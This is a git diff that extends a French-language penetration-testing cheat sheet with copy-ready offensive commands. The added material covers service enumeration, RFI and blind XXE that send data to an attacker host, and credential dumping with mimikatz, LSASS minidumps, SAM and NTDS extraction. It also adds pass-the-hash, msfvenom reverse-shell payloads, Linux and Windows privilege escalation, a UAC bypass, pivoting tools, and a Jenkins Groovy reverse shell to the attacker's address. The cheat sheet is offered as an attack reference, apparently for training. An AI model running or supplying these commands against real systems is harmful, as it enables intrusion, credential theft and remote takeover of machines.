@@ -212,6 +212,74 @@ evil-winrm -i <IP_CIBLE> -u utilisateur -p motdepasse
 evil-winrm -i <IP_CIBLE> -u utilisateur -H <HASH_NTLM>
 ```
 
+### NFS (2049)
+
+```bash
+# - Lister les partages disponibles
+showmount -e <IP_CIBLE>
+nmap --script=nfs-ls,nfs-showmount -p 111,2049 <IP_CIBLE>
+
+# - Monter un partage
+mkdir /tmp/nfs && mount -t nfs <IP_CIBLE>:/partage /tmp/nfs
+
+# - Verifier no_root_squash (partage monte avec uid 0)
+cat /etc/exports   # sur la cible si acces ; chercher no_root_squash
+```
+
+### IMAP / POP3 (143 / 110)
+
+```bash
+# - Connexion IMAP manuelle
+nc -nv <IP_CIBLE> 143
+a LOGIN utilisateur motdepasse
+a LIST "" *
+a SELECT INBOX
+a FETCH 1 all
+
+# - Connexion POP3 manuelle
+nc -nv <IP_CIBLE> 110
+USER utilisateur
+PASS motdepasse
+LIST
+RETR 1
+
+# - Avec curl
+curl -k "imaps://<IP_CIBLE>" --user utilisateur:motdepasse
+curl -k "imaps://<IP_CIBLE>/INBOX;MAILINDEX=1" --user utilisateur:motdepasse
+```
+
+### IPMI (623 UDP)
+
+```bash
+# - Detection
+nmap -sU -p 623 <IP_CIBLE>
+
+# - Enumeration avec ipmitool
+ipmitool -I lanplus -H <IP_CIBLE> -U admin -P admin user list
+
+# - Extraction des hashes IPMI 2.0 (zero-auth bypass)
+use auxiliary/scanner/ipmi/ipmi_dumphashes   # Metasploit
+# Hashes hashcat mode 7300 (IPMI2 RAKP HMAC-SHA1)
+hashcat -m 7300 ipmi_hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Oracle TNS (1521)
+
+```bash
+# - Enumeration
+nmap --script=oracle-tns-version -p 1521 <IP_CIBLE>
+tnscmd10g version -h <IP_CIBLE>
+
+# - Brute force SID
+nmap --script=oracle-sid-brute -p 1521 <IP_CIBLE>
+
+# - Connexion (impacket)
+mssqlclient.py utilisateur/motdepasse@<IP_CIBLE>:1521
+
+# - Connexion avec odat
+odat all -s <IP_CIBLE> -p 1521
+```
+
 ---
 
 ## Enumeration web
@@ -489,6 +557,65 @@ WhOaMi
 | Base64 | `bash<<<$(base64 -d<<<PAYLOAD)` | `iex "$([...FromBase64String('PAYLOAD')])"` |
 | Hex (xxd) | `bash<<<$(xxd -r -p<<<HEXVAL)` | N/A |
 
+### RFI (Remote File Inclusion)
+
+```bash
+# - Verifier allow_url_include
+# Via LFI : ?file=php://filter/convert.base64-encode/resource=/etc/php.ini
+# Decoder : echo "BASE64" | base64 -d | grep allow_url_include
+
+# - RCE via HTTP (si allow_url_include=On)
+# Creer le shell sur votre machine :
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+python3 -m http.server 8080
+# Inclusion :
+http://<IP_CIBLE>/page?file=http://<IP_ATTAQUANT>:8080/shell.php&cmd=id
+
+# - RCE via FTP
+python3 -m pyftpdlib -p 21
+http://<IP_CIBLE>/page?file=ftp://<IP_ATTAQUANT>/shell.php&cmd=id
+
+# - RCE via SMB (Windows)
+impacket-smbserver partage . -smb2support
+http://<IP_CIBLE>/page?file=\\<IP_ATTAQUANT>\partage\shell.php&cmd=whoami
+```
+
+### IDOR
+
+```bash
+# - Enumeration de masse sur un parametre numerique
+for i in $(seq 1 100); do
+  curl -s "http://<IP_CIBLE>/api/user?uid=$i" | jq '.username'
+done
+
+# - Enumeration avec ffuf
+ffuf -u "http://<IP_CIBLE>/api/user?uid=FUZZ" \
+  -w <(seq 1 500) -fs <TAILLE_REPONSE_VIDE>
+
+# - Contournement d'ID hash (recalculer le hash)
+echo -n "uid=2" | md5sum
+# Remplacer le hash dans la requete Burp
+
+# - IDOR sur API REST
+# GET /api/v1/profile/2  -> modifier l'ID dans Repeater
+# POST /api/v1/message   -> modifier uid dans le body JSON
+```
+
+### HTTP Verb Tampering
+
+```bash
+# - Tester les verbes autorises
+curl -s -X OPTIONS http://<IP_CIBLE>/admin/ -i | grep Allow
+
+# - Bypass d'authentification avec GET -> HEAD/POST/PUT
+curl -s -X HEAD http://<IP_CIBLE>/admin/
+curl -s -X PUT http://<IP_CIBLE>/admin/page
+
+# - Bypass de filtre de securite (le filtre ne couvre que POST)
+curl -s -X GET "http://<IP_CIBLE>/page?cmd=id"
+curl -s -X PATCH "http://<IP_CIBLE>/page" -d "param=valeur"
+```
+
 ### XXE
 
 ```xml
@@ -502,10 +629,20 @@ WhOaMi
 <!-- - SSRF -->
 <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 
-<!-- - Out-of-band (blind) -->
+<!-- - Out-of-band (blind) via DTD externe -->
+<!-- evil.dtd sur votre serveur : -->
 <!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<IP_ATTAQUANT>/?d=%file;'>">
+%eval;
+%exfil;
+<!-- Payload dans la requete : -->
 <!ENTITY % dtd SYSTEM "http://<IP_ATTAQUANT>/evil.dtd">
 %dtd;
+
+<!-- - XXE via SVG upload -->
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg>&xxe;</svg>
 ```
 
 ---
@@ -582,6 +719,113 @@ john --show hash.txt
 
 ---
 
+## Password attacks
+
+### Extraction de credentials (Linux)
+
+```bash
+# - Hashs depuis /etc/shadow
+sudo cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# - Recherche de credentials dans les fichiers
+grep -rn "password\|passwd\|pwd\|secret\|key" /etc/ 2>/dev/null
+find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password"
+cat ~/.bash_history | grep -i "pass\|user\|-p "
+
+# - Cles privees SSH
+find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
+cat /home/*/.ssh/id_rsa
+cat /root/.ssh/id_rsa
+```
+
+### Extraction de credentials (Windows)
+
+```powershell
+# - SAM via registry (necessite SYSTEM)
+reg save HKLM\SAM C:\Temp\sam
+reg save HKLM\SYSTEM C:\Temp\system
+# Sur la machine d'attaque :
+secretsdump.py LOCAL -sam sam -system system -outputfile hashes
+
+# - SAM via VSS (shadow copy)
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\Temp\sam
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system C:\Temp\system
+
+# - LSASS dump (necessite SeDebugPrivilege)
+# Via Task Manager : clic droit LSASS -> creer un fichier de vidage
+# Via rundll32 :
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID_LSASS> C:\Temp\lsass.dmp full
+# Sur la machine d'attaque :
+pypykatz lsa minidump lsass.dmp
+
+# - Mimikatz
+.\mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords    # credentials en memoire
+sekurlsa::wdigest           # mots de passe en clair (si WDigest actif)
+lsadump::sam                # hashes SAM
+lsadump::lsa /patch         # hashes LSA
+lsadump::dcsync /user:krbtgt /domain:DOMAINE.LOCAL  # DCSync
+
+# - NTDS.dit (Domain Controller)
+# Via ntdsutil :
+ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
+# Sur la machine d'attaque :
+secretsdump.py LOCAL -ntds C:\Temp\ntds\Active\ Directory\ntds.dit -system C:\Temp\ntds\registry\SYSTEM
+
+# - Recherche de credentials
+cmdkey /list                                              # credentials sauvegardes
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # autologon
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s              # community strings
+dir C:\Users\ /s /b *.txt *.ini *.config 2>nul | findstr /i "pass"
+```
+
+### Pass-the-Hash / Pass-the-Ticket
+
+```bash
+# - Pass-the-Hash (format LMHASH:NTHASH ou :NTHASH)
+crackmapexec smb <IP_CIBLE> -u admin -H <HASH_NTLM>
+psexec.py DOMAINE/admin@<IP_CIBLE> -hashes :<HASH_NTLM>
+evil-winrm -i <IP_CIBLE> -u admin -H <HASH_NTLM>
+xfreerdp /v:<IP_CIBLE> /u:admin /pth:<HASH_NTLM> /cert:ignore
+
+# - Overpass-the-Hash (hash -> ticket Kerberos)
+.\mimikatz.exe "sekurlsa::pth /user:admin /domain:DOMAINE /ntlm:<HASH>"
+
+# - Pass-the-Ticket
+# Exporter le ticket :
+.\mimikatz.exe "sekurlsa::tickets /export"
+# Importer le ticket :
+.\mimikatz.exe "kerberos::ptt ticket.kirbi"
+# Ou via impacket :
+export KRB5CCNAME=ticket.ccache
+psexec.py -k -no-pass DOMAINE/utilisateur@hote.domaine.local
+```
+
+### Generation de wordlists personnalisees
+
+```bash
+# - CeWL (depuis un site web)
+cewl http://<IP_CIBLE> -d 3 -m 6 -w wordlist.txt
+
+# - CUPP (profil utilisateur)
+python3 cupp.py -i   # interactif
+
+# - Mutagen (regles hashcat)
+hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt > mutated.txt
+
+# - Username wordlist depuis nom/prenom
+cat noms.txt | while read nom; do
+  echo "${nom:0:1}$(echo $nom | cut -d' ' -f2)"    # jdoe
+  echo "$(echo $nom | cut -d' ' -f2).$(echo $nom | cut -d' ' -f1)"  # doe.john
+done
+```
+
+---
+
 ## Shells
 
 ### Reverse shells
@@ -646,6 +890,39 @@ echo '<?php system($_GET["cmd"]); ?>' > cmd.php
 
 # - ASP
 <% eval request("cmd") %>
+```
+
+### msfvenom
+
+```bash
+# - Lister les payloads
+msfvenom -l payloads | grep "linux/x64\|windows/x64"
+
+# - ELF Linux stageless
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f elf -o shell.elf
+
+# - EXE Windows stageless
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f exe -o shell.exe
+
+# - EXE Windows staged (Meterpreter)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f exe -o meter.exe
+
+# - WAR (Tomcat)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f war -o shell.war
+
+# - PHP webshell
+msfvenom -p php/reverse_php LHOST=<IP_ATTAQUANT> LPORT=4444 -f raw -o shell.php
+
+# - Encodage basique (pas suffisant contre AV modernes)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 \
+  -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe
+
+# - Listener multi/handler
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST <IP_ATTAQUANT>
+set LPORT 4444
+exploit -j
 ```
 
 ---
@@ -733,10 +1010,63 @@ cat /etc/crontab; ls -la /etc/cron*     # Cron jobs
 ls -la /etc/passwd /etc/shadow          # Permissions
 env                                      # Variables d'environnement
 ps auxww                                # Processus
+cat /etc/exports                        # NFS no_root_squash
 
 # - Outils automatises
 ./linpeas.sh | tee linpeas.txt
 ./pspy64                                # Surveiller les processus sans root
+```
+
+#### LD_PRELOAD (sudo env_keep)
+
+```bash
+# /tmp/priv.c :
+# #include <stdio.h>
+# #include <sys/types.h>
+# #include <stdlib.h>
+# void _init() { unsetenv("LD_PRELOAD"); setuid(0); setgid(0); system("/bin/bash"); }
+gcc -fPIC -shared -nostartfiles -o /tmp/priv.so /tmp/priv.c
+sudo LD_PRELOAD=/tmp/priv.so <binaire_autorise>
+```
+
+#### NFS no_root_squash
+
+```bash
+# Sur votre machine d'attaque (root requis) :
+showmount -e <IP_CIBLE>
+mkdir /tmp/nfs && mount -t nfs <IP_CIBLE>:/partage /tmp/nfs
+# Copier bash et lui mettre le SUID :
+cp /bin/bash /tmp/nfs/bash && chmod +s /tmp/nfs/bash
+# Sur la cible :
+/tmp/partage/bash -p   # shell root
+```
+
+#### Docker breakout
+
+```bash
+# Si dans le groupe docker :
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+# Si dans un conteneur avec --privileged :
+fdisk -l                         # reperer le disque hote
+mkdir /tmp/host && mount /dev/sda1 /tmp/host
+chroot /tmp/host                 # shell sur l'hote
+```
+
+#### LXD breakout
+
+```bash
+# Sur la machine d'attaque : construire l'image Alpine
+git clone https://github.com/saghul/lxd-alpine-builder
+./build-alpine && python3 -m http.server 8080
+# Sur la cible :
+wget http://<IP_ATTAQUANT>:8080/alpine-v3.xx-x86_64.tar.gz
+lxc image import alpine-*.tar.gz --alias myimage
+lxc init myimage mycontainer -c security.privileged=true
+lxc config device add mycontainer host-root disk source=/ path=/r recursive=true
+lxc start mycontainer && lxc exec mycontainer /bin/sh
+# Dans le conteneur :
+ls /r/root/
 ```
 
 | Vecteur | Verification | Exploitation |
@@ -750,6 +1080,9 @@ ps auxww                                # Processus
 | **Kernel** | `uname -r` | Exploit kernel (DirtyPipe, etc.) |
 | **Docker/LXD** | `id` (groupe docker/lxd) | Monter le filesystem hote |
 | **Writable /etc/passwd** | `ls -la /etc/passwd` | Ajouter un utilisateur root |
+| **LD_PRELOAD (sudo)** | `sudo -l` (env_keep+=LD_PRELOAD) | Charger une .so malveillante |
+| **NFS no_root_squash** | `cat /etc/exports` | Monter depuis l'attaquant en root |
+| **Shared library** | `ldd /binaire_suid` | Creer une .so hijackee dans le path |
 
 ### Windows
 
@@ -761,6 +1094,28 @@ net localgroup Administrators
 systeminfo
 cmdkey /list                          # Credentials sauvegardes
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # Autologon
+
+# - Services et binaires
+wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+accesschk.exe -uwcv * 2>nul           # Services avec permissions faibles
+sc qc <nom_service>                   # Detail d'un service
+
+# - DLL hijacking
+# Identifier les DLL manquantes avec Procmon/Process Monitor
+# Verifier les chemins inscriptibles dans %PATH%
+$env:PATH -split ";" | ForEach-Object { icacls $_ }
+
+# - UAC bypass (fodhelper, Medium -> High)
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(default)" "cmd /c start C:\Temp\shell.exe"
+Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" ""
+Start-Process "C:\Windows\System32\fodhelper.exe"
+
+# - HiveNightmare / SeriousSam (CVE-2021-36934)
+icacls C:\Windows\System32\config\sam   # verifier si Users a acces
+copy C:\Windows\System32\config\sam C:\Temp\sam
+copy C:\Windows\System32\config\system C:\Temp\system
+# Sur votre machine : secretsdump.py LOCAL -sam sam -system system
 
 # - Outils automatises
 .\winPEASx64.exe
@@ -777,6 +1132,9 @@ Import-Module .\PowerUp.ps1; Invoke-AllChecks
 | **Service writable** | `accesschk.exe -uwcv *` | Modifier le binPath du service |
 | **Autologon** | Registry Winlogon | Credentials en clair |
 | **SAM/SYSTEM** | Copier depuis `C:\Windows\System32\config\` | `secretsdump.py LOCAL -sam SAM -system SYSTEM` |
+| **UAC bypass** | `whoami /groups` (Medium Mandatory Level) | fodhelper.exe, eventvwr.exe |
+| **DLL hijacking** | Services avec chemin DLL inscriptible | Creer la DLL manquante dans le chemin |
+| **HiveNightmare** | `icacls C:\Windows\System32\config\sam` | Lire SAM/SYSTEM sans admin (CVE-2021-36934) |
 
 ---
 
@@ -828,6 +1186,149 @@ ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 8081 utilisateur@<IP_P
 >> session
 >> start
 sudo ip route add 172.16.8.0/24 dev ligolo
+```
+
+### Sshuttle
+
+```bash
+# - Tunneliser tout le trafic vers un sous-reseau via SSH
+sshuttle -r utilisateur@<IP_PIVOT> 172.16.8.0/24
+
+# - Avec cle privee
+sshuttle -r utilisateur@<IP_PIVOT> --ssh-cmd "ssh -i cle.pem" 172.16.8.0/24
+
+# - Exclure la machine pivot
+sshuttle -r utilisateur@<IP_PIVOT> 172.16.0.0/16 -e <IP_PIVOT>
+```
+
+### Rpivot
+
+```bash
+# - Serveur (machine d'attaque)
+python3 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
+
+# - Client (hote compromis)
+python3 client.py --server-ip <IP_ATTAQUANT> --server-port 9999
+
+# - Configurer proxychains (socks4 127.0.0.1 9050)
+proxychains nmap -sT -p 80,443 <IP_INTERNE>
+```
+
+### Pivoting Windows (Plink / Netsh)
+
+```cmd
+:: - Plink.exe (SSH client Windows) - reverse SOCKS
+plink.exe -D 8181 -fw utilisateur@<IP_ATTAQUANT>
+
+:: - Netsh port forwarding (sans outil externe)
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.8.10
+netsh interface portproxy show all
+netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
+```
+
+### Meterpreter pivot
+
+```bash
+# - Apres avoir un shell Meterpreter sur la machine pivot :
+run autoroute -s 172.16.8.0/24      # ajouter la route
+run autoroute -p                    # verifier les routes
+
+# - SOCKS proxy via Meterpreter
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 1080
+set VERSION 5
+run -j
+# proxychains.conf : socks5 127.0.0.1 1080
+
+# - Port forwarding Meterpreter
+portfwd add -l 13389 -p 3389 -r 172.16.8.20
+# Connexion : xfreerdp /v:127.0.0.1:13389 /u:utilisateur /p:motdepasse
+```
+
+---
+
+## Applications communes
+
+### WordPress
+
+```bash
+# - Enumeration
+wpscan --url http://<IP_CIBLE> --enumerate u,p,t,cb,dbe
+wpscan --url http://<IP_CIBLE> -U admin -P /usr/share/wordlists/rockyou.txt
+
+# - RCE via Theme Editor (acces admin requis)
+# Appearance -> Theme Editor -> choisir un theme non actif -> 404.php
+# Inserer : <?php system($_GET["cmd"]); ?>
+# Appeler : http://<IP_CIBLE>/wp-content/themes/<theme>/404.php?cmd=id
+
+# - RCE via Metasploit
+use exploit/unix/webapp/wp_admin_shell_upload
+set RHOSTS <IP_CIBLE>
+set USERNAME admin
+set PASSWORD motdepasse
+set TARGETURI /
+exploit
+
+# - Credential harvesting depuis wp-config.php
+cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD"
+```
+
+### Tomcat
+
+```bash
+# - Enumeration
+nmap --script=http-tomcat-manager -p 8080 <IP_CIBLE>
+gobuster dir -u http://<IP_CIBLE>:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+# - Brute force Tomcat Manager
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -s 8080 http-get://<IP_CIBLE>/manager/html
+# Identifiants par defaut : tomcat:tomcat, admin:admin, tomcat:s3cret
+
+# - RCE via upload WAR (Manager requis)
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f war -o shell.war
+curl -u tomcat:s3cret http://<IP_CIBLE>:8080/manager/text/deploy?path=/shell -T shell.war
+curl http://<IP_CIBLE>:8080/shell/   # declencher le shell
+```
+
+### Jenkins
+
+```bash
+# - Enumeration
+nmap -sV -p 8080 <IP_CIBLE>
+# Verifier /login, /api, /script (Script Console)
+
+# - RCE via Script Console (Groovy) - acces admin requis
+# Naviguer vers /script :
+cmd = "id"
+println cmd.execute().text
+
+# Reverse shell via Script Console :
+String host = "<IP_ATTAQUANT>";
+int port = 4444;
+String cmd2 = "bash -i >& /dev/tcp/${host}/${port} 0>&1";
+["bash", "-c", cmd2].execute();
+
+# - RCE via Metasploit
+use exploit/multi/http/jenkins_script_console
+set RHOSTS <IP_CIBLE>
+set RPORT 8080
+exploit
+```
+
+### Joomla / Drupal
+
+```bash
+# - Joomla
+joomscan -u http://<IP_CIBLE>
+# RCE : Extensions -> Templates -> Choisir template -> modifier un .php
+# Credentials par defaut admin:admin dans /administrator
+
+# - Drupal
+droopescan scan drupal -u http://<IP_CIBLE>
+# RCE : Modules -> PHP filter (si disponible) -> activer + creer un article avec du PHP
+# CVE-2018-7600 (Drupalgeddon2) :
+python3 drupalgeddon2.py http://<IP_CIBLE>
 ```
 
 ---
